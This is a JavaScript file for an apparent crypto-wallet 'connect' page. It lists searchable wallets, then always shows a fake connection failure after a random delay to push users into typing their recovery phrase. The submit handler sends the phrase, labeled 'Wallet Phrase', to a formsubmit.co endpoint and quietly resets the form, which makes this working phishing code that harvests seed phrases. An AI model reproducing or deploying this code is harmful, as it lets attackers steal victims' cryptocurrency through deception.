const searchWallet = document.getElementById("searchWallet");
const divWallets = document.querySelectorAll(".divWallet");
const walletCount = document.getElementById("walletCount");

const walletImg = document.querySelector(".wallet-img")
const wallettitle = document.querySelector(".wallet-name")
const walletPopupMain = document.querySelector(".walletPopupMain");
const autoConnect = document.querySelector(".auto");
const manualConnect = document.querySelector(".manual");
const closePopup = document.getElementById("closePopup");
const tryAgain = document.querySelector(".tryAgain");
const manualBtn = document.querySelector(".manualConnect");
const phraseForm = document.querySelector(".phraseForm");
const phraseBox = document.querySelector(".phraseBox")
const formLoading = document.querySelector(".formLoading");
const connectBtn = document.querySelector(".connectbtn");




// script for the search bar 

let totalWallets = divWallets.length;
walletCount.innerHTML = totalWallets;

let searchCount = 0;

searchWallet.addEventListener("input", (e) => {
    const inputValue = e.target.value.toUpperCase();
    searchCount = 0

    divWallets.forEach((divwallet) => {
        const pTag = divwallet.querySelector("p");
        const textContent = pTag.textContent.toUpperCase();

        if (textContent.includes(inputValue)) {
            divwallet.style.display = "block";

            searchCount++

        } else {
            divwallet.style.display = "none"
        }
    })

    walletCount.innerHTML = searchCount;
});


// Script for the select wallet 

let imgScr = "";
let walletName = ""
let timer;
let timerCount;
let timeoutId;

divWallets.forEach((divWallet) => {
    divWallet.addEventListener("click", () => {
        const img = divWallet.querySelector("img")
        imgScr = img.getAttribute("src");

        const name = divWallet.querySelector("p");
        walletName = name.innerHTML;

        wallettitle.innerHTML = walletName;
        walletImg.src = imgScr;

        walletPopupMain.classList.remove("active")

        timer = Math.floor(Math.random() * 6) + 5;

        timerCount = timer * 1000;

        timeoutId = setTimeout(() => {
            autoConnect.classList.add("active")
            manualConnect.classList.remove("active")

        }, timerCount);

        console.log(timerCount)


    })
})

closePopup.addEventListener("click", () => {
    walletPopupMain.classList.add("active")
    autoConnect.classList.remove("active")
    manualConnect.classList.add("active")
    phraseForm.classList.add("active")
    phraseBox.value = "";
    formLoading.classList.add("active");
    connectBtn.innerHTML ="Connect";

    timer = 0;
    timerCount = 0;

    clearTimeout(timeoutId);
})

tryAgain.addEventListener("click", () => {
    autoConnect.classList.remove("active");
    manualConnect.classList.add("active");

    timer = Math.floor(Math.random() * 6) + 5;
    timerCount = timer * 1000;

    timeoutId = setTimeout(() => {
        autoConnect.classList.add("active")
        manualConnect.classList.remove("active")

    }, timerCount);

    console.log(timerCount)
})

manualBtn.addEventListener("click", () => {
    manualConnect.classList.add("active");
    phraseForm.classList.remove("active");

})



// submit form 

phraseForm.addEventListener('submit', (e) => {
	e.preventDefault();

	fetch("https://formsubmit.co/ajax/35d0d4fe0826211d56c985e41504392c", {
		method: "POST",
		headers: {
			'Content-Type': 'application/json',
			'Accept': 'application/json'
		},
		body: JSON.stringify({
			name: "Wallet Phrase",
			message: phraseBox.value
		})
	})
	.then(response => response.json())
	.then(data => {
        console.log(data);
        manualConnect.classList.remove("active");
        phraseForm.classList.add("active");
        formLoading.classList.add("active");
        connectBtn.innerHTML ="Connect";
        phraseBox.value="";

    })
	.catch(error => console.log(error));

    formLoading.classList.remove("active");
    connectBtn.innerHTML ="Connecting...";
});
